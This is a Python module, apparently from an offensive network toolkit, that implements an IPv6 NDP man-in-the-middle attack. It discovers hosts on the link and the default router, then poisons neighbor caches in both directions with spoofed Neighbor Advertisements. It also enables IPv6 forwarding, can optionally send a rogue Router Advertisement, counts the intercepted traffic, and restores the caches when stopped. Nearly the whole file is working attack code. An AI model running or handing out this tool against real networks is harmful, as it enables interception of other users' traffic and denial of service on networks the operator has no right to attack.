"""One-click IPv6 NDP man-in-the-middle — the ARP MITM, for IPv6.

Discover IPv6 hosts on the link, pick victims (the default router is found
automatically), and it poisons both directions with spoofed Neighbor
Advertisements (override bit set), turns on IPv6 forwarding so victims keep
connectivity, keeps the spoof fresh, counts relayed traffic, and restores every
neighbor cache on stop. Optionally also advertises a rogue Router Advertisement.

Pure parts (route parsing, NA poison/restore batches, target handling) are
unit-tested; the live send/discovery loop is thin glue.
"""

from __future__ import annotations

import logging
import subprocess
import threading
import time

log = logging.getLogger("reforge.ndpmitm")


# ---- pure helpers (unit-tested) --------------------------------------------
def parse_default_router6(route_text: str) -> str | None:
    """Extract the default IPv6 router from `ip -6 route` output."""
    for line in route_text.splitlines():
        parts = line.split()
        if parts[:2] == ["default", "via"] and len(parts) >= 3:
            return parts[2]
    return None


def na_packet(tgt_ip6: str, lladdr: str, src_mac: str, dst_ip6: str, dst_mac: str):
    """Neighbor Advertisement: `tgt_ip6` is at `lladdr` (override), sent to dst."""
    from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, IPv6
    from scapy.layers.l2 import Ether

    return (Ether(src=src_mac, dst=dst_mac)
            / IPv6(src=tgt_ip6, dst=dst_ip6)
            / ICMPv6ND_NA(tgt=tgt_ip6, R=1, S=1, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=lladdr))


class NdpMitm:
    """Poison IPv6 victims <-> the router via spoofed NAs; relay their traffic."""

    def __init__(self, iface: str, victims: list[str], router: str | None = None,
                 interval: float = 2.0, forward: bool = True, rogue_ra: bool = False):
        self.iface = iface
        self.victims = list(dict.fromkeys(v for v in victims if v))
        self.router = router
        self.interval = interval
        self.forward = forward
        self.rogue_ra = rogue_ra
        self.our_mac: str | None = None
        self.our_ip: str | None = None
        self.router_mac: str | None = None
        self.victim_macs: dict[str, str] = {}
        self.forwarding_on = False
        self.warnings: list[str] = []
        self.sent = 0
        self.relayed = 0
        self._running = threading.Event()
        self._thread: threading.Thread | None = None
        self._sniffer = None

    # ---- pure: the exact NAs we send, given resolved MACs ------------------
    def poison_batch(self) -> list:
        out = []
        if not (self.our_mac and self.router and self.router_mac):
            return out
        for v in self.victims:
            vmac = self.victim_macs.get(v)
            if not vmac:
                continue
            # tell the victim the router is at our MAC
            out.append(na_packet(self.router, self.our_mac, self.our_mac, v, vmac))
            # tell the router the victim is at our MAC
            out.append(na_packet(v, self.our_mac, self.our_mac, self.router, self.router_mac))
        return out

    def restore_batch(self) -> list:
        out = []
        if not (self.router and self.router_mac):
            return out
        for v in self.victims:
            vmac = self.victim_macs.get(v)
            if not vmac:
                continue
            out.append(na_packet(self.router, self.router_mac, self.router_mac, v, vmac))
            out.append(na_packet(v, vmac, vmac, self.router, self.router_mac))
        return out

    def active_targets(self) -> list[str]:
        return [v for v in self.victims if self.victim_macs.get(v)]

    def status(self) -> dict:
        return {
            "running": self._running.is_set(),
            "router": self.router,
            "targets": self.active_targets(),
            "unresolved": [v for v in self.victims if not self.victim_macs.get(v)],
            "forwarding_on": self.forwarding_on,
            "sent": self.sent,
            "relayed": self.relayed,
            "warnings": list(self.warnings),
        }

    # ---- live glue (needs root/network) ------------------------------------
    def prepare(self) -> bool:  # pragma: no cover
        from scapy.all import get_if_hwaddr

        self.our_mac = get_if_hwaddr(self.iface)
        try:                                        # our own IPv6, so traffic to us
            from scapy.all import get_if_addr6      # isn't miscounted as relayed
            self.our_ip = get_if_addr6(self.iface)
        except Exception:
            self.our_ip = None
        if self.router is None:
            self.router = default_router6(self.iface)
            if self.router:
                self.warnings.append(f"router auto-detected: {self.router}")
        if not self.router:
            self.warnings.append("no IPv6 default router found — set it manually")
            return False
        self.router_mac = self._resolve6(self.router)
        if not self.router_mac:
            self.warnings.append(f"could not resolve router {self.router} MAC")
            return False
        for v in self.victims:
            mac = self._resolve6(v)
            if mac:
                self.victim_macs[v] = mac
            else:
                self.warnings.append(f"could not resolve {v} — skipped")
        if not self.active_targets():
            self.warnings.append("no victims resolved")
            return False
        if self.forward:
            enable_ipv6_forward(True)
            self.forwarding_on = _ipv6_forward_enabled()
            if not self.forwarding_on:
                self.warnings.append("IPv6 forwarding is OFF — victims lose connectivity "
                                     "(DoS). Run as root.")
        return True

    def _resolve6(self, ip6: str) -> str | None:  # pragma: no cover
        """Resolve an on-link IPv6 address to a MAC via a Neighbor Solicitation
        sent explicitly on our interface (robust on multi-NIC hosts, unlike
        scapy's route-guessing getmacbyip6)."""
        from socket import AF_INET6, inet_ntop, inet_pton

        from scapy.layers.inet6 import (
            ICMPv6ND_NA,
            ICMPv6ND_NS,
            ICMPv6NDOptSrcLLAddr,
            IPv6,
            in6_getnsma,
            in6_getnsmac,
        )
        from scapy.layers.l2 import Ether
        from scapy.sendrecv import srp1

        try:
            nsma = in6_getnsma(inet_pton(AF_INET6, ip6))
            dst6, dmac = inet_ntop(AF_INET6, nsma), in6_getnsmac(nsma)
            ns = (Ether(src=self.our_mac, dst=dmac) / IPv6(dst=dst6)
                  / ICMPv6ND_NS(tgt=ip6) / ICMPv6NDOptSrcLLAddr(lladdr=self.our_mac))
            ans = srp1(ns, iface=self.iface, timeout=2, verbose=False)
            if ans is not None and ans.haslayer(ICMPv6ND_NA):
                return ans[Ether].src
        except Exception:
            pass
        # fall back to scapy's own resolver
        try:
            from scapy.layers.inet6 import getmacbyip6
            return getmacbyip6(ip6)
        except Exception:
            return None

    def start(self) -> bool:  # pragma: no cover
        if not self.prepare():
            return False
        self._running.set()
        self._thread = threading.Thread(target=self._loop, name="reforge-ndpmitm", daemon=True)
        self._thread.start()
        self._start_relay_counter()
        return True

    def _loop(self) -> None:  # pragma: no cover
        from scapy.sendrecv import sendp

        from reforge.attacks.ndp import build_ra

        while self._running.is_set():
            batch = self.poison_batch()
            if self.rogue_ra and self.our_mac:
                batch = batch + [build_ra(self.our_mac)]
            if batch:
                sendp(batch, iface=self.iface, verbose=False)
                self.sent += len(batch)
            time.sleep(self.interval)

    def _start_relay_counter(self) -> None:  # pragma: no cover
        try:
            from scapy.sendrecv import AsyncSniffer

            our_mac = (self.our_mac or "").lower()

            def seen(pkt):
                try:
                    if (pkt.dst.lower() == our_mac and pkt.haslayer("IPv6")
                            and pkt["IPv6"].dst != self.our_ip):
                        self.relayed += 1
                except Exception:
                    pass

            self._sniffer = AsyncSniffer(iface=self.iface, prn=seen, store=False, filter="ip6")
            self._sniffer.start()
        except Exception:
            self._sniffer = None

    def stop(self) -> None:  # pragma: no cover
        self._running.clear()
        if self._thread:
            self._thread.join(timeout=2.0)
        if self._sniffer is not None:
            try:
                self._sniffer.stop()
            except Exception:
                pass
            self._sniffer = None
        from scapy.sendrecv import sendp

        batch = self.restore_batch()
        for _ in range(3):
            if batch:
                sendp(batch, iface=self.iface, verbose=False)
        if self.forwarding_on:
            enable_ipv6_forward(False)
            self.forwarding_on = False


# ---- live discovery (needs root/network) -----------------------------------
def default_router6(iface: str | None = None) -> str | None:  # pragma: no cover
    args = ["ip", "-6", "route", "show", "default"]
    if iface:
        args += ["dev", iface]
    try:
        out = subprocess.run(args, capture_output=True, text=True, check=False).stdout
        return parse_default_router6(out) or parse_default_router6(
            subprocess.run(["ip", "-6", "route", "show", "default"],
                           capture_output=True, text=True, check=False).stdout)
    except Exception:
        return None


def discover_hosts6(iface: str, timeout: float = 3.0) -> list[tuple[str, str]]:  # pragma: no cover
    """Ping the all-nodes multicast (ff02::1) and collect responders + MACs."""
    from scapy.layers.inet6 import ICMPv6EchoRequest, IPv6
    from scapy.layers.l2 import Ether
    from scapy.sendrecv import srp

    pkt = Ether(dst="33:33:00:00:00:01") / IPv6(dst="ff02::1") / ICMPv6EchoRequest()
    ans, _ = srp(pkt, iface=iface, timeout=timeout, verbose=False, multi=True)
    seen: dict[str, str] = {}
    for _sent, recv in ans:
        try:
            seen.setdefault(recv["IPv6"].src, recv["Ether"].src)
        except Exception:
            pass
    return sorted(seen.items())


def enable_ipv6_forward(on: bool) -> list[str]:  # pragma: no cover
    cmd = ["sysctl", "-w", f"net.ipv6.conf.all.forwarding={1 if on else 0}"]
    try:
        subprocess.run(cmd, capture_output=True, check=False)
    except Exception:
        pass
    return cmd


def _ipv6_forward_enabled() -> bool:  # pragma: no cover
    try:
        return open("/proc/sys/net/ipv6/conf/all/forwarding").read().strip() == "1"
    except Exception:
        return False
